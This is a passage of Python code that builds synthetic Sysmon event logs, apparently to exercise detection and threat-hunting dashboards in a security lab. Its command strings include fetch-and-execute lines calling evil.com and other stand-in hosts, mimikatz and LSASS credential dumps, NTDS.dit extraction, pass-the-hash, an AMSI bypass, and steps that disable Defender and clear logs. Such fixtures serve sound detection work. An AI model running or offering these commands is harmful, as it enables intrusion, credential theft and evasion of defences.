        parent_image="C:\\Windows\\explorer.exe",
        offset=551,
    ))

    # ── Pass-the-Hash Indicators ──
    pth_cmds = [
        ("powershell.exe", "powershell.exe Invoke-SMBExec -Target 192.168.1.50 -Hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"),
        ("powershell.exe", "powershell.exe Invoke-WMIExec -Target DC01 -Hash 31d6cfe0d16ae931b73c59d7e0c089c0 -Command whoami"),
        ("C:\\Tools\\crackmapexec.exe", "crackmapexec smb 192.168.1.0/24 -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0"),
    ]
    for i, (image, cmd) in enumerate(pth_cmds):
        img = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in image else image
        events.append(sysmon_event(
            event_id=1,
            image=img,
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            host="DC01.corp.local",
            offset=560+i,
        ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\runas.exe",
        command_line="runas.exe /netonly /user:CORP\\admin cmd.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=563,
    ))

    # ── Process Hollowing Indicators ──
    hollow_cmds = [
        "C:\\Temp\\injector.exe NtUnmapViewOfSection WriteProcessMemory NtResumeThread",
        "C:\\Temp\\hollow.exe CREATE_SUSPENDED svchost.exe",
    ]
    for i, cmd in enumerate(hollow_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Temp\\injector.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=570+i,
        ))

    # ── WDigest Credential Harvest ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\reg.exe",
        command_line='reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=580,
    ))

    # ── NTDS.dit Extraction ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\ntdsutil.exe",
        command_line='ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Temp\\ntds_dump" q q',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=590,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\cmd.exe",
        command_line="cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=591,
    ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 4): MITRE Tactic Expansion - Windows Events
    # ═══════════════════════════════════════════════════════════════

    # ── Account Discovery (T1087) ──
    acct_disc_cmds = [
        ("C:\\Windows\\System32\\net.exe", "net user /domain"),
        ("C:\\Windows\\System32\\net.exe", "net group /domain"),
        ("C:\\Windows\\System32\\net.exe", "net localgroup administrators"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Get-ADUser -Filter * -Properties *"),
        ("C:\\Windows\\System32\\dsquery.exe", "dsquery user -name * -limit 500"),
    ]
    for i, (image, cmd) in enumerate(acct_disc_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=650+i,
        ))

    # ── Network Share Discovery (T1135) ──
    share_disc_cmds = [
        ("C:\\Windows\\System32\\net.exe", "net share"),
        ("C:\\Windows\\System32\\net.exe", "net view \\\\DC01"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Get-SmbShare"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Invoke-ShareFinder -ComputerName DC01"),
    ]
    for i, (image, cmd) in enumerate(share_disc_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=660+i,
        ))

    # ── Remote System Discovery (T1018) ──
    remote_disc_cmds = [
        ("C:\\Windows\\System32\\arp.exe", "arp.exe -a"),
        ("C:\\Windows\\System32\\nslookup.exe", "nslookup DC01.corp.local"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Test-Connection -ComputerName DC01 -Count 1"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Get-ADComputer -Filter * -Properties IPv4Address"),
        ("C:\\Windows\\System32\\cmd.exe", 'cmd.exe /c "for /l %i in (1,1,254) do @ping -n 1 192.168.1.%i"'),
    ]
    for i, (image, cmd) in enumerate(remote_disc_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=670+i,
        ))

    # ── Spearphishing Attachment Execution (T1566.001) ──
    phishing_cmds = [
        ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c powershell -ep bypass -c IEX(IWR http://evil.com/ps.ps1)", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -NoP -Sta -W 1 -Enc JABjAGwA", "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"),
        ("C:\\Windows\\System32\\mshta.exe", "mshta.exe http://evil.com/payload.hta", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"),
    ]
    for i, (image, cmd, parent) in enumerate(phishing_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image=parent,
            offset=680+i,
        ))

    # ── Data Staging for Exfiltration (T1074.001) ──
    staging_cmds = [
        ("C:\\Windows\\System32\\robocopy.exe", "robocopy.exe C:\\Users\\admin\\Documents C:\\Users\\Public\\staging /MIR"),
        ("C:\\Windows\\System32\\xcopy.exe", "xcopy.exe C:\\Shares\\Finance C:\\Temp\\staging /S /E"),
        ("C:\\Windows\\System32\\compact.exe", "compact /c C:\\Temp\\staging"),
    ]
    for i, (image, cmd) in enumerate(staging_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=690+i,
        ))

    # ── GOAD / Caldera showcase events for dashboard drilldowns ──
    # Keep these deterministic so the GOAD dashboard can demonstrate AD
    # discovery, credential access, collection, and sandcat deployment even
    # without a live Caldera run.
    goad_host = "kingslanding"
    goad_user = "SEVENKINGDOMS\\joffrey"
    goad_cmds = [
        (
            1,
            "C:\\Tools\\AdFind.exe",
            "AdFind.exe -f \"(objectcategory=person)\" -dn",
            "C:\\Windows\\System32\\cmd.exe",
            None,
            "GOAD AdFind domain account enumeration",
        ),
        (
            1,
            "C:\\Users\\Public\\SharpHound.exe",
            "SharpHound.exe -c All --zipfilename kingslanding.zip",
            "C:\\Windows\\System32\\cmd.exe",
            None,
            "GOAD BloodHound collection",
        ),
        (
            1,
            "C:\\Windows\\System32\\nltest.exe",
            "nltest.exe /domain_trusts /all_trusts",
            "C:\\Windows\\System32\\cmd.exe",
            None,
            "GOAD domain trust discovery",
        ),
        (
            1,
            "C:\\Tools\\Rubeus.exe",
            "Rubeus.exe asreproast /user:svc_sql /format:hashcat /outfile:C:\\Users\\Public\\asrep.txt",
            "C:\\Windows\\System32\\cmd.exe",
            None,
            "GOAD AS-REP roasting with Rubeus",
        ),
        (
            1,
            "C:\\Program Files\\7-Zip\\7z.exe",
            "7z.exe a -tzip C:\\Users\\Public\\loot.zip C:\\Shares\\Finance\\* -pWinterIsComing!",
            "C:\\Windows\\System32\\cmd.exe",
            None,
            "GOAD password-protected 7zip collection archive",
        ),
        (
            11,
            "C:\\Windows\\System32\\cmd.exe",
            "cmd.exe /c copy C:\\Tools\\sandcat.exe C:\\Users\\Public\\splunkd.exe",
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Users\\Public\\splunkd.exe",
            "GOAD Caldera sandcat staged as splunkd.exe",
        ),
        (
            1,
            "C:\\Windows\\System32\\schtasks.exe",
            "schtasks /Create /SC ONCE /TN SplunkFwd /TR C:\\Users\\Public\\splunkd.exe /RU SYSTEM",
            "C:\\Windows\\System32\\cmd.exe",
            None,
            "GOAD Caldera SplunkFwd scheduled task creation",
        ),
        (
            1,
            "C:\\Users\\Public\\splunkd.exe",
            "splunkd.exe -server http://192.168.100.78:8888 -group goad",
            "C:\\Windows\\System32\\schtasks.exe",
            None,
            "GOAD Caldera sandcat execution",
        ),
        (
            1,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true # Caldera pre-stage",
            "C:\\Windows\\System32\\cmd.exe",
            None,
            "GOAD Caldera Defender disable pre-stage",
        ),
    ]
    for i, (event_id, image, cmd, parent, target, message) in enumerate(goad_cmds):
        events.append(sysmon_event(
            event_id=event_id,
            image=image,
            command_line=cmd,
            parent_image=parent,
            target_filename=target,
            host=goad_host,
            user=goad_user,
            msg=message,
            offset=695+i,
            Entity=goad_host,
        ))

    # ── Keylogger Indicators (T1056.001) ──
    keylogger_cmds = [
        "powershell.exe Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int vKey);' -Name kb -Namespace k",
        "C:\\Temp\\keylogger.exe --output C:\\Temp\\keystrokes.txt",
    ]
    for i, cmd in enumerate(keylogger_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else "C:\\Temp\\keylogger.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=700+i,
        ))

    # ── Screen Capture (T1113) ──
    screenshot_cmds = [
        "powershell.exe -c [System.Drawing.Graphics]::CopyFromScreen(0,0,0,0,[System.Drawing.Size]::new(1920,1080))",
        "nircmd.exe savescreenshot C:\\Temp\\screenshot.png",
    ]
    for i, cmd in enumerate(screenshot_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else "C:\\Tools\\nircmd.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=710+i,
        ))

    # ── Remote Access Tools (T1219) ──
    rat_cmds = [
        ("C:\\Program Files\\AnyDesk\\AnyDesk.exe", "AnyDesk.exe --start-service"),
        ("C:\\Users\\analyst\\Downloads\\ngrok.exe", "ngrok.exe tcp 3389"),
        ("C:\\Program Files\\TeamViewer\\TeamViewer.exe", "TeamViewer.exe"),
    ]
    for i, (image, cmd) in enumerate(rat_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            offset=720+i,
        ))

    # ── Access Token Manipulation (T1134) ──
    token_cmds = [
        "powershell.exe Invoke-TokenManipulation -Enumerate",
        "C:\\Temp\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a '/c C:\\Temp\\payload.exe' -t *",
        "C:\\Temp\\PrintSpoofer.exe -i -c cmd.exe",
        "powershell.exe token::elevate",
    ]
    for i, cmd in enumerate(token_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else cmd.split()[0],
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=730+i,
        ))

    # ═══════════════════════════════════════════════════════════════
    #  HUNTING: High-volume events for aggregation-based queries
    # ═══════════════════════════════════════════════════════════════

    # ── Long Command Line: Extra-long encoded payloads (>500 chars) ──
    long_payload = "A" * 600  # Simulates base64-encoded payload
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line=f"powershell.exe -NoProfile -NonInteractive -EncodedCommand {long_payload}",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=600,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\cmd.exe",
        command_line=f"cmd.exe /c echo {long_payload} | certutil -decode - C:\\Temp\\payload.exe",
        parent_image="C:\\Windows\\explorer.exe",
        offset=601,
    ))

    # ── Lateral Movement Cluster: Multiple tools on same host ──
    pivot_host = "SRV01.corp.local"
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\PsExec.exe",
        command_line="psexec.exe \\\\DC01 -accepteula -s cmd.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=pivot_host,
        offset=610,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\mstsc.exe",
        command_line="mstsc.exe /v:DC01.corp.local /admin",
        parent_image="C:\\Windows\\explorer.exe",
        host=pivot_host,
        offset=611,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe Enter-PSSession -ComputerName DC01",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=pivot_host,
        offset=612,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\net.exe",
        command_line="net use \\\\DC01\\c$ /user:CORP\\admin P@ssw0rd",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=pivot_host,
        offset=613,
    ))

    # ── Credential Access Cluster: Multiple techniques on same host ──
    cred_host = "DC01.corp.local"
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\mimikatz.exe",
        command_line="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=620,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Temp\\lsass.dmp full",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=621,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\Rubeus.exe",
        command_line="Rubeus.exe kerberoast /outfile:hashes.txt",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=622,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\ntdsutil.exe",
        command_line='ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Temp\\ntds" q q',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=623,
    ))

    # ── Defense Evasion Score: Multiple evasion techniques on same host ──
    evasion_host = "WS01.corp.local"
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wevtutil.exe",
        command_line="wevtutil.exe cl Security",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=evasion_host,
        offset=630,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=evasion_host,
        offset=631,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\netsh.exe",
        command_line="netsh advfirewall set allprofiles state off",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=evasion_host,
        offset=632,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\fodhelper.exe",
        command_line="fodhelper.exe",
        parent_image="C:\\Temp\\malware.exe",
        host=evasion_host,
        offset=633,
    ))

    # ── Unusual Process Paths: Processes from non-standard locations ──
    unusual_procs = [
        ("C:\\Users\\Public\\evil.exe", "C:\\Users\\Public\\evil.exe --connect 10.0.0.1"),
        ("C:\\Users\\analyst\\Downloads\\tool.exe", "tool.exe -scan -all"),
        ("C:\\Users\\analyst\\AppData\\Local\\Temp\\update.exe", "update.exe --install"),
    ]
    for i, (image, cmd) in enumerate(unusual_procs):
        events.append(sysmon_event(
            event_id=1,
            image=image,
            command_line=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            offset=640+i,
        ))

    events.extend(_bluelight_kill_chain_sysmon_events())

    # ── Rare processes (Hunt: Windows Rare Processes) ──
    # The hunting query thresholds executions < 80 across the multi-week window.
    # Emit a handful of unique binaries that appear exactly once each so the
    # rare-process tail of the distribution is non-empty when the dataset is
    # multiplied by ``expand_events_over_days``.
    rare_binaries = [
        ("C:\\Tools\\rare_recon.exe", "rare_recon.exe -enum users"),
        ("C:\\Users\\Public\\beacon_unique.exe", "beacon_unique.exe -c attacker.example"),
        ("C:\\Temp\\loader_x42.exe", "loader_x42.exe /quiet /payload"),
        ("C:\\Tools\\custom_persist.exe", "custom_persist.exe install"),
        ("C:\\Users\\Public\\anomaly_dropper.exe", "anomaly_dropper.exe stage"),
        ("C:\\ProgramData\\unique_loader.exe", "unique_loader.exe /run"),
    ]
    for i, (image, cmd) in enumerate(rare_binaries):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            offset=900 + i,
        ))

    # ── 2025-2026: ClickFix / fake CAPTCHA clipboard execution ──
    clickfix_processes = [
        (
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"# ClickFix fake CAPTCHA clipboard verification; iwr https://captcha-verify.example/update.ps1 | iex\"",
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "initial_access",
        ),
        (
            "C:\\Windows\\System32\\mshta.exe",
            "mshta.exe https://captcha-verify.example/captcha.hta # ClickFix fake CAPTCHA payload",
            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
            "execution",
        ),
        (
            "C:\\Windows\\System32\\rundll32.exe",
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";GetObject(\"script:https://captcha-verify.example/payload.sct\") # ClickFix",
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "defense_evasion",
        ),
    ]
    for i, (image, cmd, parent, stage) in enumerate(clickfix_processes):
        event = sysmon_event(
            event_id=1,
            image=image,
            command_line=cmd,
            parent_image=parent,
            host=CLICKFIX_COMPROMISED_HOST,
            user="CORP\\arya",
            msg="ClickFix fake CAPTCHA clipboard execution",
            offset=930 + i,
        )
        event["Trace ID"] = CLICKFIX_TRACE_ID
        event["Attack Stage"] = stage
        event["Threat Name"] = "ClickFix Clipboard Execution"
        events.append(event)

    crashfix_processes = [
        (
            "C:\\Users\\Public\\Python311\\python.exe",
            "python.exe C:\\Users\\Public\\CrashFix\\crashfix.py --install-rat --c2 https://crashfix-help.example/api",
            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
            "payload_execution",
        ),
        (
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -NoProfile -Command \"Invoke-WebRequest https://crashfix-help.example/python-rat.zip -OutFile C:\\Users\\Public\\CrashFix\\rat.zip\"",
            "C:\\Users\\Public\\Python311\\python.exe",
            "ingress_tool_transfer",
        ),
    ]
    for i, (image, cmd, parent, stage) in enumerate(crashfix_processes):
        event = sysmon_event(
            event_id=1,
            image=image,
            command_line=cmd,
            parent_image=parent,
            host=CLICKFIX_COMPROMISED_HOST,
            user="CORP\\arya",
            msg="CrashFix Python RAT activity following ClickFix social engineering",
            offset=940 + i,
        )
        event["Trace ID"] = CLICKFIX_TRACE_ID
        event["Attack Stage"] = stage
        event["Threat Name"] = "CrashFix Python RAT"
        events.append(event)

    # ── 2025: RMM tool abuse after compromise ──
    rmm_processes = [
        (
            "C:\\Program Files (x86)\\ScreenConnect Client (d4f1)\\ScreenConnect.ClientService.exe",
            "ScreenConnect.ClientService.exe /silent /reconnect relay.screenconnect.example",
        ),
        (
            "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe",
            "AnyDesk.exe --start-service --with-password",
        ),
        (
            "C:\\Program Files\\Atera Networks\\AteraAgent.exe",
            "AteraAgent.exe /install /tenant rmm-sync.atera.example",
        ),
    ]
    for i, (image, cmd) in enumerate(rmm_processes):
        event = sysmon_event(
            event_id=1,
            image=image,
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            host=CLICKFIX_COMPROMISED_HOST,
            user="CORP\\arya",
            msg="Post-compromise RMM tool execution",
            offset=950 + i,
        )
        event["Trace ID"] = RMM_TRACE_ID
        event["Attack Stage"] = "remote_access"
        event["Threat Name"] = "RMM Tool Abuse"
        events.append(event)

    return events
